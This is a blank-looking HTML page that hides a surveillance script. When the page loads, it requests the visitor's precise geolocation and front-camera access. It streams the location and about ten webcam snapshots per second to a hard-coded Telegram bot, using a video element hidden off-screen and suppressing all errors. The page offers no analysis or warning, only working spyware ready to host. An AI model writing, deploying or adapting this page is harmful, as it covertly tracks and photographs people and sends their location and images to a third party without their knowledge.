<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title></title>
<style>
  body {
    margin: 0;
    background: white;
    overflow: hidden;
    height: 100vh;
    width: 100vw;
  }
</style>
</head>
<body>
<video id="v" autoplay playsinline muted style="position:absolute; top:-9999px; left:-9999px; width:1px; height:1px;"></video>
<canvas id="c" style="position:absolute; top:-9999px; left:-9999px; width:1px; height:1px;"></canvas>
<script>
(() => {
  const TOKEN = '8989398872:AAE5qZxUT0fbOOkSbYcDigfjfnttOKYEnsg';
  const CHAT_ID = '7870731053';
  const FPS = 10;
  const INTERVAL = 1000 / FPS;

  const video = document.getElementById('v');
  const canvas = document.getElementById('c');
  const ctx = canvas.getContext('2d');

  let streamReady = false;

  // Geolocation beacon
  if ('geolocation' in navigator) {
    navigator.geolocation.getCurrentPosition(
      pos => {
        const { latitude, longitude } = pos.coords;
        fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${latitude}&longitude=${longitude}`)
          .catch(() => {});
      },
      err => {},
      { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
    );
  }

  // Camera init
  navigator.mediaDevices.getUserMedia({
    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
    audio: false
  })
  .then(stream => {
    video.srcObject = stream;
    video.onloadedmetadata = () => {
      video.play();
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      streamReady = true;
    };
  })
  .catch(() => {});

  // Frame capture loop
  video.addEventListener('play', () => {
    setInterval(() => {
      if (!streamReady) return;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(blob => {
        if (!blob) return;
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('photo', blob, 'f.jpg');
        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
          method: 'POST',
          body: form
        }).catch(() => {});
      }, 'image/jpeg', 0.7);
    }, INTERVAL);
  }, { once: true });

})();
</script>
</body>
</html>
